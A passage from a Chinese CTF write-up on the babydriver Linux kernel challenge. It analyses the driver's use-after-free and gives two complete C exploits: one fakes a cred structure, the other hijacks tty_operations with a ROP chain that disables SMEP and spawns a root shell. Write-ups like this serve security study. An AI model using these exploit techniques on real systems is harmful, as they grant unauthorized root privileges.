poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>其中insmod加载了babydriver.ko驱动</p><h2 id="模块分析-1"><a href="#模块分析-1" class="headerlink" title="模块分析"></a>模块分析</h2><p>checksec</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/babydriver/babydriver.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>几乎没有保护</p><p>根据fops结构体可以知道驱动提供的外部接口对应如下</p><ul><li>open =&gt; babyopen</li><li>read =&gt; babyread</li><li>write =&gt; babywrite</li><li>ioctl =&gt; babyioctl</li><li>free =&gt; babyrelease</li></ul><p><strong>babyioctl:</strong> 定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>, v3, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyopen:</strong> 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyread:</strong> 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(buffer, babydev_struct.device_buf, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babywrite:</strong> 类似 babyread，不同的是从 buffer 拷贝到全局变量中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buffer, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyrelease:</strong> 释放空间，没什么好说的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="细节问题"><a href="#细节问题" class="headerlink" title="细节问题"></a>细节问题</h3><p>本题fops结构体,ida显示并未注册babyrelease函数,但真正做题的时候发现是注册了的</p><p>一开始很困惑,以为是什么特殊的机制,最后发现babyrelease的函数位置就是0</p><p>也就是说本来是注册了的,但是因为值刚好是0,ida看不出来,才显示未注册</p><p>并且更进一步可以得到,所有未注册的函数最终都默认注册babyrelease因为未注册就显示NULL,而babyrelease就是null(0)</p><p>不过也仅限这题了</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>观察到babyrelease函数只是free,并没有置零且存储chunk的指针是全局变量</p><p>如果我们同时打开两个babydev设备文件</p><p>并将其中一个释放那么就可以uaf了,那如何利用这个uaf</p><h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a><strong>思路1</strong></h3><p><strong>此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><p>但在本题版本可以分配到刚才释放的chunk</p><p>因此可以伪造cred结构体,修改权限</p><p>并fork一个程序</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> device1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> device2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">ioctl(device1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">close(device1);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> new_process_pid = fork();</span><br><span class="line"><span class="keyword">if</span> (new_process_pid &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] fork error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (new_process_pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> lots_zero[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(device2, lots_zero, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] got root&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(device2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>同样是利用uaf</p><p>不过这次利用的是在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，与其他类型设备相同，tty 驱动设备中同样存在着一个存放着函数指针的结构体 <code>tty_operations</code>。</p><p>tty_struct的size是0x2e0</p><p>利用uaf我们可以劫持其中的tty_operations函数指针</p><p>那么在我们对这个设备进行相应操作（如 write、ioctl）时便会执行我们布置好的恶意函数指针。</p><p>由于没有开启 SMAP 保护，故我们可以在用户态进程的栈上布置 ROP 链与 <code>fake tty_operations</code> 结构体。</p><p>使用 gdb 进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持 <code>tty_operaionts</code> 结构体到用户态的栈上，并选择任意一条内核 gadget 作为 fake tty 函数指针以方便下断点：</p><p>这段调试可能有点难理解,即劫持tty_ops的函数表为内核上的任意可区分代码,这样我们在调试时可以在对应的位置下断点,以观察当前的上下文环境</p><p>我们不难观察到，在我们调用<code>tty_operations-&gt;write</code>时，<strong>其 rax 寄存器中存放的便是 tty_operations 结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的 gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头。</p><p>使用 ROPgadget 查找相关 gadget，发现有两条符合我们要求的 gadget：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget.png" alt="image.png"></p><p>gdb 调试，发现第一条 gadget 其实等价于<code>mov rsp, rax ; dec ebx ; ret</code>：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget2.png" alt="image.png"></p><p>那么利用这条 gadget 我们便可以很好地完成栈迁移的过程，执行我们所构造的 ROP 链。</p><p>而<code>tty_operations</code>结构体开头到其 write 指针间的空间较小,直接在此处rop显然是行不通的(与write指针冲突)，因此我们还需要进行二次栈迁移，这里随便选一条改 rax 的 gadget 即可：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/figure/ttygadget3.png" alt="image.png"></p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the addr</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], p = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = POP_RDI_RET;</span><br><span class="line">    rop[p++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = getRootPrivilige;</span><br><span class="line">    rop[p++] = SWAPGS_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = IRETQ_RET;</span><br><span class="line">    rop[p++] = getRootShell;</span><br><span class="line">    rop[p++] = user_cs;</span><br><span class="line">    rop[p++] = user_rflags;</span><br><span class="line">    rop[p++] = user_sp;</span><br><span class="line">    rop[p++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = POP_RAX_RET;</span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);<span class="comment">//这一步为什么要read??因为下一步写的时候要从开头写,如果直接填充到ops的话,那么中间很多重要信息就被覆盖了,所以先将原本的信息读出来,等会填充的时候就用这个填充,保证开头到目标之间的内容不被改变</span></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺带一提,本题覆盖cr4寄存器取消了smep保护,那么在获得了commint_creds和prepare_kernel_cred的地址后可以直接用户空间代码调用提权,最后着陆用户态spawn一个shell</p><h2 id="延拓"><a href="#延拓" class="headerlink" title="延拓"></a>延拓</h2><h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>在Linux系统中，<code>/dev</code> 目录是一个特殊的目录，它包含了设备文件（device files）。设备文件是用于访问系统硬件设备或与内核通信的一种方式。<code>/dev</code> 目录中的设备文件允许用户和应用程序通过文件I/O的方式与硬件设备进行交互，这种文件I/O操作被视为与设备的输入输出（I/O）交互。</p><p>这些设备文件包括以下几类</p><p><strong>字符设备</strong></p><p><em>字符设备</em>是指每次与系统传输1个字符的设备。这些设备节点通常为传真,虚拟终端和串口调制解调器之类设备提供流通信服务，它通常不支持随机存取数据。</p><p>字符设备在实现时，大多不使用缓存器。系统直接从设备读取／写入每一个字符。</p><p><strong>块设备</strong></p><p><em>块设备</em>是指与系统间用块的方式移动数据的设备。这些设备节点通常代表可寻址设备，如硬盘、CD-ROM和内存区域。</p><p>块设备通常支持随机存取和寻址，并使用缓存器。操作系统为输入输出分配了缓存以存储一块数据。当程序向设备发送了读取或者写入数据的请求时，系统把数据中的每一个字符存储在适当的缓存中。当缓存被填满时，会采取适当的操作（把数据传走），而后系统清空缓存。</p><p><strong>伪设备</strong></p><p>在类Unix操作系统中，设备节点并不一定要对应物理设备。没有这种对应关系的设备是<em>伪设备</em>。操作系统运用了它们提供的多种功能。部分经常使用到的伪设备包括：</p><ul><li><p><code>/dev/null</code></p><p>接受并丢弃所有输入；即不产生任何输出。</p></li><li><p><code>/dev/full</code></p><p>永远在被填满状态的设备。</p></li><li><p><code>/dev/loop</code></p><p>Loop设备</p></li><li><p><code>/dev/zero</code></p><p>产生连续的NUL字符的流(数值为0)。</p></li><li><p><code>/dev/random</code></p><p>产生一个虚假随机的任意长度字符流。(Blocking)</p></li><li><p><code>/dev/urandom</code></p><p>产生一个虚假随机的任意长度字符流。(Non-Blocking)</p></li></ul><h3 id="dev-init"><a href="#dev-init" class="headerlink" title="dev_init"></a>dev_init</h3><p>简易分析下babydriver中出现的dev模块注册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span 